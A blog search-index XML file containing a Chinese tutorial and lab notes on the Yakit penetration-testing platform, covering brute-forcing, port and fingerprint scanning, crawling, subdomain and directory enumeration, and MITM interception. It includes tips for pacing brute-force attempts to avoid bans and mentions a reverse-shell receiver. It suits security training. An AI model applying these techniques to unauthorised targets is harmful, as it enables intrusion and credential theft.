<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Yakit单兵安全能力平台</title>
      <link href="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/"/>
      <url>/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Yakit介绍"><a href="#一、Yakit介绍" class="headerlink" title="一、Yakit介绍"></a>一、Yakit介绍</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>Yakit是一款集成化的网络安全单兵工具，基于Yak语言开发，提供图形化界面，旨在简化安全测试流程。它集成了多种功能，包括MITM攻击、Web模糊测试等，支持从信息收集到攻击实施的渗透测试全流程。Yakit通过模块化设计，结合Yaklang语言和gRPC通信层，确保了灵活性和扩展性。用户无需编写代码即可执行复杂测试，同时支持自定义脚本以满足特定需求。Yakit强调在合法授权下使用，以确保所有安全测试活动合规合法。</p><p>Yak 语言核心提供了非常强大的安全能力，为了让 Yak 本身的安全能力更容易贴近大家的实际使用，降低使用的门槛，我们在为 Yak 编写了 gRPC 服务器，并使用这个服务器实现 / 构建了一个客户端：Yakit。</p><p>Yakit 是 Yak 的衍生项目，对于一些不想写代码的安全从业者，Yakit会为Yak中所有的能力提供合适的GUI，通过Yakit的GUI去操控引擎的能力，随着版本更迭，GUI会更加成熟。Yakit的gRPC服务器，让用户部署更加方便快捷，与平台无关，可选择远程部署或直接本地启动在主机中使用。</p><p>能做到什么？</p><ol><li>类 Burpsuite 的 MITM 劫持操作台</li><li>查看所有劫持到的请求的历史记录以及分析请求的参数</li><li>全球第一个可视化的 Web 模糊测试工具：Web Fuzzer</li><li>Yak Cloud IDE：内置智能提示的 Yak 语言云 IDE</li><li>ShellReceiver：开启 TCP 服务器接收反弹交互式 Shell 的反连</li><li>第三方 Yak 模块商店：社区主导的第三方 Yak 模块插件，你想要的应有尽有</li></ol><h2 id="1-2-Yakit架构"><a href="#1-2-Yakit架构" class="headerlink" title="1.2 Yakit架构"></a>1.2 Yakit架构</h2><p>Yakit 的核心并不在工具本身上，而是依托于 Yak gRPC 接口； 也就是说，我们可以仅仅只把 Yakit 当作一个 “视窗” 来操纵 Yak 引擎来完成我们想要实现的安全能力。</p><p>用一张图来简单解释一下 Yakit 的架构是怎么样与传统安全工具有所区别的：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.16.11.png" style="zoom:40%;"><ul><li>Yakit 的能力需要 Yak 引擎</li></ul><p>​Yakit 所有的能力都建立在 Yak 引擎提供对应版本的 gRPC 接口支持的基础上。</p><p>​所以，Yak 引擎启动之后，Yakit 才能连接执行各种各样的安全能力。</p><h2 id="1-3-用户数据与本地文件存储"><a href="#1-3-用户数据与本地文件存储" class="headerlink" title="1.3 用户数据与本地文件存储"></a>1.3 用户数据与本地文件存储</h2><p>一般来说，本地文件与用户存储数据将会存储在 <code>$HOME/yakit-projects/</code> 目录下。</p><ul><li><p>目录中的文件包括</p><ol><li><p>MITM 需要用到的根证书与根证书的密钥</p></li><li><p>sqlite3 格式的数据库，数据库的内容是 Yakit 使用的记录，包括劫持到的请求，PoC等</p></li></ol></li></ul><p>如果本地数据库权限配置不合理，将会导致无法写入数据等问题造成 Yakit 功能不可用。</p><p>可以通过如下方式修复:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> user ~/yakit-projects<span class="token function">sudo</span> <span class="token function">chmod</span> 0755 ~/yakit-projects<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="二、安装部署"><a href="#二、安装部署" class="headerlink" title="二、安装部署"></a>二、安装部署</h1><h2 id="2-1-客户端安装"><a href="#2-1-客户端安装" class="headerlink" title="2.1 客户端安装"></a>2.1 客户端安装</h2><p><a href="https://yaklang.com/">https://yaklang.com/</a> 【下载地址】</p><h2 id="2-2-核心引擎"><a href="#2-2-核心引擎" class="headerlink" title="2.2 核心引擎"></a>2.2 核心引擎</h2><p>1.1.6版本之后引擎下载方式为自动下载安装，通过安装包安装即可同时安装客户端和引擎，无需单独安装引擎。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.28.23.png" style="zoom:40%;"><h2 id="2-3-界面初识"><a href="#2-3-界面初识" class="headerlink" title="2.3 界面初识"></a>2.3 界面初识</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.34.16.png" style="zoom:35%;"><h2 id="2-4-本地模式vs远程模式"><a href="#2-4-本地模式vs远程模式" class="headerlink" title="2.4 本地模式vs远程模式"></a>2.4 本地模式vs远程模式</h2><p>由于 Yak 核心引擎与 Yakit 的分离式安装，Yakit 仅仅作为一个客户端而存在，Yakit 的使用理所当然就应该存在两种模式</p><ol><li><p>本地模式：默认启动一个随机端口的 <code>yak grpc</code> 服务器</p></li><li><p>远程模式：yak grpc 可以启动在任何平台 / 任何网络位置，包括</p><ul><li><p>远端托管主机 ECS/VPS</p></li><li><p>本地个人 PC</p></li><li><p>内网环境</p></li></ul></li></ol><p>与此同时，yak grpc 启动参数支持设置 <code>--tls</code> 与 <code>--secret</code> 以实现一些远程连接的安全需求。</p><p>同时 Yakit 既然作为客户端，在远程模式和本地模式下，除了网络延迟之外，其他的使用体验应该是完全一致的。</p><h1 id="三、爆破与未授权检测"><a href="#三、爆破与未授权检测" class="headerlink" title="三、爆破与未授权检测"></a>三、爆破与未授权检测</h1><h2 id="3-1-简介"><a href="#3-1-简介" class="headerlink" title="3.1 简介"></a>3.1 简介</h2><p>破和未授权检测是网络安全领域中一种常见的测试技术，其主要目的是测试系统或应用程序中的口令是否强健，Yakit的爆破与未授权检测模块则实现了该部分的内容。这个模块可以对多种常见协议和服务（如ftp、memcached、mongodb、mssql、mysql、postgres、rdp、redis、smb、ssh、tomcat、vnc等）进行口令的爆破，以验证系统的安全性。</p><p>该模块的基本工作原理是：利用字典和暴力破解等技术，不断尝试各种可能的口令，直到找到正确的口令为止。如果正确的口令被找到，那么爆破程序将立即停止，并返回成功的结果。如果在一定时间内没有找到正确的口令，那么爆破程序将返回失败的结果。</p><p>为了提高爆破效率和准确性，采用多线程和异步请求等技术，可以同时进行多个协议和服务的口令爆破，大大缩短了测试时间。同时，该模块还可以自动分析和识别协议和服务的版本信息，根据不同版本的特点，进行检测。</p><h2 id="3-2-参数设置"><a href="#3-2-参数设置" class="headerlink" title="3.2 参数设置"></a>3.2 参数设置</h2><p>点击更多参数可以进行字典的自定义配置以及并发和间隔时间等高级参数的设置。</p><p>关于参数的解释：</p><ul><li>爆破用户字典：可以选择上传在<code>Payload管理</code>的字典进行爆破</li><li>爆破用户：如需对字典内容进行补充，可以在这里进行输入 -</li><li>同时使用默认字典：如勾选则表示需要使用该功能内置的默认字典，不勾选则表示不使用。</li><li>爆破密码字典、爆破密码、同时使用默认字典意义同上</li><li>自动停止：遇到第一个爆破结果时是否终止任务</li><li>目标并发：同时可爆破的目标数，yak的爆破规则为同时爆破“多个目标”，每个目标低并发。这样在有多个目标的时候，并不会影响效率，而且单个目标也不会过快导致被封禁。</li><li>最小延迟，最大延迟：可理解为超时时间，单位为s，超过时间则不会继续进行爆破。一般来讲，如果要 ban 爆破行为的话，通常会设置一个时间窗口，短时间窗口被打满会认为发生了爆破事件。如果可以再“放缓” 针对单个目标的测试强度，其实有可能可以缓解这个问题，所以我们可以通过这种设置最小延迟和最大延迟来解决这个问题。</li></ul><h2 id="3-3-实验验证（EX）"><a href="#3-3-实验验证（EX）" class="headerlink" title="3.3 实验验证（EX）"></a>3.3 实验验证（EX）</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2015.13.23.png" style="zoom:40%;"><h1 id="四、端口探测和指纹扫描"><a href="#四、端口探测和指纹扫描" class="headerlink" title="四、端口探测和指纹扫描"></a>四、端口探测和指纹扫描</h1><h2 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h2><h3 id="4-1-1-端口扫描"><a href="#4-1-1-端口扫描" class="headerlink" title="4.1.1 端口扫描"></a>4.1.1 端口扫描</h3><p>端口扫描和指纹识别是渗透测试和网络安全领域中常用的基础技术之一，用于评估目标系统的安全性和发现可能存在的漏洞和攻击面。也是Yakit基础工具的模块之一，本文将对<code>端口探测和指纹扫描模块</code>进行简单介绍。</p><p><strong>端口扫描</strong>是指通过扫描目标系统上的端口，确定哪些端口是开放的，并确定这些开放的端口上运行的服务类型和版本信息。</p><p>Yakit 使用的端口扫描的技术主要有以下几种：</p><ul><li>TCP SYN扫描：该技术利用TCP协议的三次握手过程中的SYN和ACK标志来判断端口的开放情况。扫描模块发送一个SYN标志的数据包给目标主机，如果目标主机回应了一个SYN/ACK数据包，就表明该端口是开放的。扫描模块随即发送一个RST数据包，以关闭连接。如果目标主机回应了一个RST/ACK数据包，表明该端口是关闭的。如果没有任何响应，表明该端口可能被防火墙或者入侵检测系统屏蔽了。</li><li>TCP Connect扫描：该技术利用TCP协议的三次握手过程来判断端口的开放情况。扫描模块向目标主机发起一个TCP连接请求，如果目标主机回应一个SYN/ACK数据包，表明该端口是开放的，扫描模块会回应一个ACK数据包，以建立连接。如果目标主机回应一个RST数据包，表明该端口是关闭的。如果没有任何响应，表明该端口可能被防火墙或者入侵检测系统屏蔽了。</li><li>UDP扫描：UDP协议没有像TCP协议一样的连接状态，因此UDP扫描更加复杂。扫描模块向目标主机发送一个UDP数据包，如果目标主机回应了一个ICMP端口不可达数据包，表明该端口是关闭的。如果没有任何响应，表明该端口可能是开放的。需要注意的是，由于UDP协议没有连接状态，因此UDP扫描的准确性比TCP扫描要低。</li></ul><h3 id="4-1-2-指纹识别"><a href="#4-1-2-指纹识别" class="headerlink" title="4.1.2 指纹识别"></a>4.1.2 指纹识别</h3><p><strong>指纹识别</strong>是通过对目标系统上的服务和应用程序进行识别，来确定目标系统上的操作系统、应用程序和服务信息。指纹识别技术主要通过解析网络数据包和应用程序响应消息来实现。</p><p>以下是常见的几种指纹识别技术及其原理：</p><ul><li>应用程序指纹识别：该技术通过解析应用程序的响应消息，来确定应用程序的类型和版本信息。例如，HTTP协议中的服务器响应头信息就包含了Web服务器的类型和版本信息。指纹识别器通过向目标系统发送HTTP请求，并解析响应消息中的服务器头信息，来确定Web服务器的类型和版本信息。</li><li>协议指纹识别：该技术通过解析网络数据包，来确定目标系统所使用的协议类型和版本信息。例如，通过解析TCP数据包的TCP标志位、TCP选项和窗口大小等信息，可以确定目标系统上的TCP/IP协议的版本信息。</li><li>操作系统指纹识别：该技术通过解析网络数据包中的特征信息，来确定目标系统所使用的操作系统类型和版本信息。例如，通过解析TCP数据包中的MSS、TTL、IP ID等信息，可以确定目标系统所使用的操作系统类型和版本信息。</li></ul><h2 id="4-2-用法"><a href="#4-2-用法" class="headerlink" title="4.2 用法"></a>4.2 用法</h2><ul><li>SYN扫描</li></ul><p>具有权限要求，Linux下启动yakit需要以root权限启动，windows下需要管理员权限启动，如果不是以root或者管理员权限启动会报错。</p><ul><li>指纹扫描</li></ul><p>无权限要求，可直接进行扫描，识别端口指纹.</p><ul><li>SYN+指纹扫描</li></ul><p>具有权限要求，Linux下启动yakit需要以root权限启动，windows下需要管理员权限启动，如果不是以root或者管理员权限启动会报错。</p><h2 id="4-3-实验验证（EX）"><a href="#4-3-实验验证（EX）" class="headerlink" title="4.3 实验验证（EX）"></a>4.3 实验验证（EX）</h2><p>实验验证：不如nmap好用。</p><p>我扫描的是mac上虚拟网卡bridge100上的192.168.155.34机子上开放端口和指纹的情况。一开始跳过主机存货检测的时候老是会报下面的错。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>WARN<span class="token punctuation">]</span> <span class="token number">2024</span>-12-24 <span class="token number">15</span>:07:45 <span class="token punctuation">[</span>grpc_http_request_debug:173<span class="token punctuation">]</span> execute debug script failed: <span class="token builtin class-name">exec</span> yakc with code failed: Panic Stack:__yak_main__<span class="token number">429</span> <span class="token operator">|</span>         synscan.concurrent<span class="token punctuation">(</span>synConcurrent<span class="token punctuation">)</span>, <span class="token number">430</span> <span class="token operator">|</span>         synscan.iface<span class="token punctuation">(</span>synScanNetInterface<span class="token punctuation">)</span>, <span class="token number">431</span> <span class="token operator">|</span>     <span class="token punctuation">)</span> <span class="token number">432</span> <span class="token operator">&gt;</span>     die<span class="token punctuation">(</span>err<span class="token punctuation">)</span>              ^~~~~ <span class="token number">433</span> <span class="token operator">|</span>  <span class="token number">434</span> <span class="token operator">|</span>     res, err :<span class="token operator">=</span> servicescan.ScanFromSynResult<span class="token punctuation">(</span>synResults, opts<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token number">435</span> <span class="token operator">|</span>     die<span class="token punctuation">(</span>err<span class="token punctuation">)</span>YakVM Panic: no valid <span class="token function">ping</span> results found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>单独进行syn扫描或指纹扫描的时候，识别的端口总是不全。</p><p>最后通过设置不跳过主机存活+syn+指纹扫描，得到了较为全面的结果。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2009.48.08.png" alt="截屏2024-12-25 09.48.08" style="zoom:50%;"><p>服务识别的情况并不好。</p><h1 id="五、基础爬虫"><a href="#五、基础爬虫" class="headerlink" title="五、基础爬虫"></a>五、基础爬虫</h1><h2 id="5-1-背景"><a href="#5-1-背景" class="headerlink" title="5.1 背景"></a>5.1 背景</h2><p>众所周知，爬虫是主动漏洞扫描中极其重要的一环。在漏洞扫描中，爬虫被用作一种数据收集工具，用于获取目标系统的信息以帮助我们发现漏洞。</p><p>Yakit 漏洞扫描中的<code>基础爬虫</code>通常包含以下三个主要步骤：</p><ul><li>网站爬取：爬虫首先会爬取目标系统中的网站，并将网站的源代码和相关信息存储到扫描器的数据库中。这些信息包括网站的URL、页面结构、表单、脚本和其他与网站相关的信息。</li><li>爬取数据分析：基础爬虫会对爬取的网站数据进行分析，并从中提取相关的信息，如网站的结构、链接、表单和参数等。</li><li>漏洞检测：基础爬虫会使用爬取到的信息根据加载的相关的Yakit插件进行漏洞扫描，并根据扫描结果提供相应的漏洞报告。</li></ul><p>需要注意的是，漏洞扫描中的爬虫与普通的爬虫有所不同。它并不是为了抓取网站上的数据而设计的，而是为了获取网站结构和参数等信息以帮助我们发现漏洞。同时，进行漏洞扫描时需要遵守相关的法律和道德规范，不能进行未经授权的攻击行为。</p><h2 id="5-2-其他参数"><a href="#5-2-其他参数" class="headerlink" title="5.2 其他参数"></a>5.2 其他参数</h2><ul><li>设置代理：有些网站访问不到的，可以加入代理进行访问，格式为<a href="http://127.0.0.1:7890/">http://127.0.0.1:7890</a> 或者 socks5://127.0.0.1:7890</li><li>超时时间：每个请求的最大超时时间</li><li>最大深度：设置爬虫的最大深度（逻辑深度，并不是级数）</li><li>并发量：爬虫的并发请求量（可以理解为线程数）</li><li>最大URL数：爬虫获取到的最大量URL（这个选项一般用来限制无限制的爬虫，一般不需要改动）</li><li>最大请求数：本次爬虫最多发出多少个请求？（一般用于限制爬虫行为，一般不需要改动）</li></ul><h2 id="5-3-实验验证（EX）"><a href="#5-3-实验验证（EX）" class="headerlink" title="5.3 实验验证（EX）"></a>5.3 实验验证（EX）</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.02.53.png" style="zoom:50%;"><p>  login.html都没有爬到，效果不是很好。</p><h1 id="六、空间引擎：Hunter"><a href="#六、空间引擎：Hunter" class="headerlink" title="六、空间引擎：Hunter"></a>六、空间引擎：Hunter</h1><h2 id="6-1-概述"><a href="#6-1-概述" class="headerlink" title="6.1 概述"></a>6.1 概述</h2><p>网络空间搜索引擎是一种专门用于在网络上发现和分析特定信息的搜索引擎，也是渗透测试中信息收集的方式之一。</p><p>与传统搜索引擎不同，网络空间搜索引擎的目标是搜索网络上的非常规资源，例如网络服务器、端口、IP地址、文件、目录、数据库等等。它可以帮助企业、政府机构、安全团队等进行网络情报收集和威胁情报分析。</p><p>除了hunter外，还有很多同类型的空间搜索引擎，在Yakit插件商店中也有类似的插件。</p><h2 id="6-2-使用"><a href="#6-2-使用" class="headerlink" title="6.2 使用"></a>6.2 使用</h2><p>通过配置hunter的apiKey和用户名并输入hunter语法来获取目标资产，并且左边提供poc插件进行批量检测。</p><h2 id="6-3-实验验证（EX）"><a href="#6-3-实验验证（EX）" class="headerlink" title="6.3 实验验证（EX）"></a>6.3 实验验证（EX）</h2><p>缺少空间引擎的apikey，暂未做实验验证。</p><h1 id="七、子域名收集"><a href="#七、子域名收集" class="headerlink" title="七、子域名收集"></a>七、子域名收集</h1><h2 id="7-1-背景"><a href="#7-1-背景" class="headerlink" title="7.1 背景"></a>7.1 背景</h2><p>子域名收集是指通过各种技术手段，收集某个主域名下所有的子域名列表。子域名是指在主域名前面添加一级或多级名称的域名。例如，对于主域名example.com，其子域名可以是<a href="http://www.example.com、mail.example.com、blog.example.com/">www.example.com、mail.example.com、blog.example.com</a> 等等。</p><p>子域名收集的原理主要涉及以下几个方面：</p><ul><li>域名解析：域名解析是将域名解析为对应IP地址的过程。在子域名收集过程中，可以通过查询主域名的DNS记录来获取其下的子域名列表。通过递归查询，可以获取主域名下所有的子域名。</li><li>模糊匹配：对于一些主域名，可能会存在一些常见的子域名，例如www、mail、ftp等等。通过在主域名前面添加这些常见的子域名，可以得到可能存在的子域名列表。例如，对于主域名example.com，可以尝试查询<a href="http://www.example.com、mail.example.com/">www.example.com、mail.example.com</a> 等等。</li><li>爆破技术：爆破技术是指利用程序自动化的方式，对域名进行大量的猜测和尝试，以获取其下的子域名列表。例如，可以使用字典文件对主域名进行爆破，尝试各种可能存在的子域名。</li><li>搜索引擎：通过搜索引擎的方式，可以搜索到主域名下可能存在的子域名。例如，可以使用搜索引擎的“site:example.com”命令来搜索所有以example.com结尾的子域名。</li></ul><h2 id="7-2-使用方法"><a href="#7-2-使用方法" class="headerlink" title="7.2 使用方法"></a>7.2 使用方法</h2><p>在输入框输入要测试的目标的根域名，然后点击执行即可开始爆破，爆破的结果会在下方展示，也会在数据库入库。</p><h2 id="7-3-实验验证（EX）"><a href="#7-3-实验验证（EX）" class="headerlink" title="7.3 实验验证（EX）"></a>7.3 实验验证（EX）</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.14.06.png" style="zoom:50%;"><h1 id="八、综合目录扫描与爆破"><a href="#八、综合目录扫描与爆破" class="headerlink" title="八、综合目录扫描与爆破"></a>八、综合目录扫描与爆破</h1><h2 id="8-1-背景"><a href="#8-1-背景" class="headerlink" title="8.1 背景"></a>8.1 背景</h2><p>目录扫描是一种常用的Web应用程序安全测试技术，用于发现Web应用程序中存在的可能存在的漏洞和弱点。其原理是通过对Web应用程序中的目录和文件进行遍历，来发现可能存在的安全漏洞和风险。</p><p>具体来说，目录扫描工具会通过程序自动化的方式，生成大量的HTTP请求，并请求Web应用程序中的所有可能存在的目录和文件。当Web应用程序返回200状态码时，表示该目录或文件存在；当Web应用程序返回404状态码时，表示该目录或文件不存在。通过对Web应用程序返回的状态码进行分析，目录扫描工具可以确定哪些目录或文件是存在的，哪些是不存在的。</p><p>在目录扫描过程中，目录扫描通常会使用字典文件，Yakit内置了一些常见字典，这些字典文件包含了一些常见的目录和文件路径，用于帮助目录扫描工具生成HTTP请求。此外，还可以通过调整线程的方式，同时发送多个HTTP请求，加快扫描速度。</p><p>需要注意的是，目录扫描工具的扫描结果并不一定是准确的，因为Web应用程序可能存在某些安全机制来防止目录扫描工具的攻击，例如IP封锁、User-Agent过滤等。因此，在使用目录扫描工具进行安全测试时，需要结合其他的测试技术，如手工测试、漏洞扫描等，以确保测试的全面性和准确性。</p><h2 id="8-2-使用方法"><a href="#8-2-使用方法" class="headerlink" title="8.2 使用方法"></a>8.2 使用方法</h2><p>点击<code>检查项目</code>文本框，选择想要使用的字典，在文本框输入目标后，点击<code>开始执行</code>即可针对文件以及网站目录进行扫描爆破。</p><p>支持的文件或文件类型有：.sql、.bak、.zip、.rar、admin.sql、backup.zip、web.rar，单次扫描结果可在页面下方进行展示。</p><h2 id="8-3-实验验证（EX）"><a href="#8-3-实验验证（EX）" class="headerlink" title="8.3 实验验证（EX）"></a>8.3 实验验证（EX）</h2><p>后续搭建靶场进行测试。</p><h1 id="九、专项漏洞测试"><a href="#九、专项漏洞测试" class="headerlink" title="九、专项漏洞测试"></a>九、专项漏洞测试</h1><h2 id="9-1-背景"><a href="#9-1-背景" class="headerlink" title="9.1 背景"></a>9.1 背景</h2><p>专项漏洞检测是针对特定应用程序或系统进行的安全漏洞扫描技术，旨在检测与该应用程序或系统相关的安全漏洞。</p><p>Yakit通过对常见的中间件、CMS、框架、组件进行总结、归纳，并针对这些组件对其常见的高危漏洞进行了整理。</p><p>通过预制漏洞源码，对可以对某类特定目标进行专项的漏洞检测，可以自定义新增poc种类。</p><h2 id="9-2-使用方法"><a href="#9-2-使用方法" class="headerlink" title="9.2 使用方法"></a>9.2 使用方法</h2><p>首先点击左上角的下拉菜单，选择自己想要检测的组件，选择完成后在右侧文本框中输入想要检测的目标点击执行任务即可开始扫描。</p><p>单次扫描的结果可以在<code>命中风险与漏洞</code>中查看。</p><p>若要进行批量的检测，点击<code>额外配置</code>然后<code>点击此处</code>上传文本文件</p><h2 id="9-3-实验验证（EX）"><a href="#9-3-实验验证（EX）" class="headerlink" title="9.3 实验验证（EX）"></a>9.3 实验验证（EX）</h2><p>后续研究具体漏洞时进行相应的实验验证。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.25.02.png" style="zoom:50%;"><h1 id="十、自动化漏洞检测"><a href="#十、自动化漏洞检测" class="headerlink" title="十、自动化漏洞检测"></a>十、自动化漏洞检测</h1><h2 id="10-1-背景"><a href="#10-1-背景" class="headerlink" title="10.1 背景"></a>10.1 背景</h2><p>渗透测试是一种通过模拟黑客攻击的方式，通常情况下一般会包括以下步骤：</p><ul><li>信息收集：通过搜索引擎、whois查询、子域名枚举、网络拓扑分析等方式，收集目标系统的基础信息，如IP地址、域名、主机名、操作系统、服务等。</li><li>端口扫描：使用端口扫描工具，扫描目标系统的开放端口，确定哪些端口是开放的，以及哪些服务运行在这些端口上。</li><li>漏洞探测：使用漏洞扫描工具，对目标系统进行漏洞扫描，探测目标系统是否存在已知漏洞或弱点。</li><li>漏洞验证：对扫描工具发现的漏洞进行验证，确认漏洞是否真实存在、是否可利用，以及漏洞对系统的影响程度。</li></ul><p>在具体实践中，信息收集和端口扫描通常是漏洞检测的第一步，以便对目标系统的结构和组件有一个大体的了解。接下来，漏洞探测和漏洞验证则是确定目标系统是否存在安全漏洞的关键步骤。</p><p>漏洞检测是一项复杂的任务，需要根据目标系统的特点和安全需求，综合选择适当的工具和技术进行测试，以尽可能全面地发现系统中存在的安全漏洞和风险。</p><p>Yakit中的基础工具，涵盖了渗透测试的全流程，本章节是对Yakit自动化渗透的探索，旨在自动化完成从信息收集、端口扫描、漏洞探测、漏洞验证的全过程。比如主机服务检测、WEB服务检测、漏洞检测、弱口令检测等场景的组合利用。</p><p>下面以信息收集、端口扫描、漏洞探测、漏洞验证的全过程为例，进行使用的说明。</p><h2 id="10-2-使用方法"><a href="#10-2-使用方法" class="headerlink" title="10.2 使用方法"></a>10.2 使用方法</h2><p>首先，打开<code>基础工具</code>–<code>端口/指纹扫描</code> 在左侧的插件处勾选各个过程所需要的插件，然后在文本框输入想要扫描的目标，</p><p>在各个插件的参数配制处根据自己的需求进行调整，然后点击执行任务进开始扫描。</p><p>每个插件扫描的结果会在对应的下方的展示栏处进行展示，可根据需求进行查看。</p><p>针对扫描IP数量多少可以做一些更多参数高级配置。</p><ul><li>扫描模式选择</li></ul><p>服务器IP数量少，我们就选择指纹扫描，这个相对来说要准确一点，但是速度要慢一点，服务器IP数据量多，我们就选择SYN扫描 或者 SYN+指纹扫描，速度较快。</p><p>主动发包超时时间设置：如果左侧选择的插件少 我们就设置5-7 如果左侧选择的插件多 我们就设置1-3</p><p>其他配置：根据详情实际情况而定，一般默认无需修改。</p><ul><li>插件批量执行模块</li></ul><p>该模块旨在自动化对URL进行扫描识别即漏洞检测。点击<code>插件</code>-选择<code>插件批量执行</code>–<code>输入目标</code>–<code>执行任务</code>即可。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.30.43.png" style="zoom:50%;"><p>注意额外配置扫描超时 默认设置2小时 7200 可以根据扫描网站数量而定设置3600都可以，并且可以设置代理等操作。</p><p>扫描到一半点击“结束”，进行中断的任务，可在未完成中选择任务继续执行。</p><h1 id="十一、MITM中间人代理与劫持"><a href="#十一、MITM中间人代理与劫持" class="headerlink" title="十一、MITM中间人代理与劫持"></a>十一、MITM中间人代理与劫持</h1><h2 id="11-1-中间人攻击简介"><a href="#11-1-中间人攻击简介" class="headerlink" title="11.1 中间人攻击简介"></a>11.1 中间人攻击简介</h2><p>“MITM” 是 “Man-in-the-Middle” 的缩写，意思是中间人攻击。</p><p>MITM攻击是一种网络攻击技术，攻击者通过欺骗的手段，让自己成为通信双方之间的中间人，从而可以窃取双方之间的通信内容、修改通信内容、甚至篡改通信流量，从而实现窃取信息、伪造信息等攻击目的。</p><p>在渗透测试中，MITM劫持可以被用来模拟真实的黑客攻击，以测试系统和应用程序的安全性。</p><p>渗透测试中使用MITM攻击的一个典型场景是在测试Web应用程序时。攻击者可以使用MITM技术拦截应用程序和服务器之间的通信，以获取用户名和密码等敏感信息，或者篡改应用程序返回的数据。攻击者可以使用代理工具，来捕获应用程序发送和接收的数据，对数据进行修改或篡改，然后重新发送到应用程序或服务器。这样就可以测试应用程序是否可以有效地防范MITM攻击，并且是否能够正确地处理应用程序和服务器之间的通信。</p><p>MITM攻击还可以用来测试网络的弱点，并检测是否存在潜在的漏洞。通过MITM攻击，渗透测试人员可以捕获网络中传输的数据，并进行分析和审查，以发现可能存在的安全问题。</p><p>例如，攻击者可以利用MITM攻击来欺骗局域网内的设备，并拦截设备之间的通信流量，从而窃取敏感信息，或者篡改数据包，对网络进行进一步的攻击。</p><p>总的来说，MITM劫持是渗透测试中常用的一种技术，它可以帮助测试人员发现网络中可能存在的安全漏洞，提供相应的建议和解决方案，从而保护系统和应用程序的安全。</p><h2 id="11-2-MITM-交互式劫持技术"><a href="#11-2-MITM-交互式劫持技术" class="headerlink" title="11.2 MITM 交互式劫持技术"></a>11.2 MITM 交互式劫持技术</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.55.27.png" alt="YakMITM劫持原理示意图" style="zoom:50%;"><p>Yakit的MITM模块原理是启动一个HTTP代理，自动转发流量，当用户启动手动劫持后，会停止自动转发，阻塞请求，并将请求出栈，做解压Gzip、处理chunk、解码等处理，让请求变得人类可读，并显示在用户前端，用户可以对请求做查看、修改或重放。</p><p>重放时，会对用户构造的HTTP请求数据包做修复，保证请求包的有效性。Yak引擎手动实现了HTTP库，所以用户可以自定义畸形的请求包、响应包，应用于一些特殊场景下的漏洞利用。</p><p>MITM操作台可百分百替代 BurpSuite，下载并安装证书、劫持请求、响应、编辑劫持到的数据包等。</p><p>并且提供一整套顺畅的工作流，劫持 =&gt; History =&gt; Repeater / Intruder，劫持到的数据，在History可以查看历史数据，选择需要“挖掘”的数据包，发送到 WebFuzzer 进行 Repeater / Intruder 操作。</p><p>除了这些典型的操作场景外，MITM 还提供了插件被动扫描、热加载、数据包替换、标记等更灵活的功能。</p><h2 id="11-3-免配置模式"><a href="#11-3-免配置模式" class="headerlink" title="11.3 免配置模式"></a>11.3 免配置模式</h2><p>使用免配置模式。不需要任何其他配置，只需安装Chrome 浏览器，免配置启动之后将打开一个新的浏览器会话，其中所有流量都将通过 Yakit 自动代理。无需安装 Yakit 的 CA 证书就可以使用它来通过 HTTPS 进行测试。</p><p>点击<code>渗透测试</code>–<code>MITM交互式劫持</code>即可进入MITM劫持页面，点击<code>免配置启动</code>进入免配置启动设置界面。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.04.49.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.09.40.png" style="zoom:50%;"><p>配置代理处默认为：<a href="http://127.0.0.1:8083/">http://127.0.0.1:8083</a> 默认配置代理无需修改，点击<code>启动免配置Chrome</code> 默认启动谷歌浏览器，即开始劫持抓包，点击图中④的<code>免配置启动</code>即可关闭代理。</p><h2 id="11-4-安装证书启动MITM劫持"><a href="#11-4-安装证书启动MITM劫持" 